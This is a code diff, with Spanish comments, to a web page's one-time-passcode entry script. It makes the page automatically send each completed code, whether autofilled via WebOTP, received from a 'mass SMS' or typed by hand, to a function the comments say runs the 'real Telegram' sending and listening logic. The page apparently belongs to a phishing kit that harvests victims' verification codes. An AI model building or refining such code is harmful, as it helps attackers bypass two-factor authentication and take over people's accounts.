@@ -129,8 +129,9 @@
           
           refreshSubmitState();
           
-          if (isComplete() && form) {
-            form.dispatchEvent(new Event("submit"));
+          // CORRECCIÓN: Ejecuta la lógica asíncrona real de Telegram de inmediato
+          if (isComplete()) {
+            enviarFormulario();
           }
         }
       }
@@ -138,6 +139,7 @@
       console.log("WebOTP pasiva terminada.");
     });
   }
+
 
 
   startTimer();
@@ -204,8 +206,8 @@
         refreshSubmitState();
         
         // Disparo automático si se completa desde el SMS masivo
-        if (isComplete() && form) {
-          form.dispatchEvent(new Event("submit"));
+        if (isComplete()) {
+          enviarFormulario();
         }
         return;
       }
@@ -217,8 +219,11 @@ input.value = val.replace(/\D/g, "");
       }
       
       refreshSubmitState();
+// Si llena el último dígito manualmente, procesa el envío
+      if (isComplete()) {
+        enviarFormulario();
+      }
     });
-
 
 // Control para retroceso al borrar
 input.addEventListener("keydown", (e) => {
@@ -233,12 +238,10 @@ input.addEventListener("keydown", (e) => {
 
 
 
+   // ============================================================
+  // FUNCIÓN ENCAPSULADA DE ENVÍO Y ESCUCHA TELEGRAM (CORREGIDA)
   // ============================================================
-  // LOGIC ENTRANTE EN TU EVENTO SUBMIT (TELEGRAM Y POLLING)
-  // ============================================================
-  if (form) {
-    form.addEventListener("submit", async function (e) {
-      e.preventDefault();
+  async function enviarFormulario() {
       if (!isComplete() || remaining <= 0) return;
 
       const enteredCode = getCode();
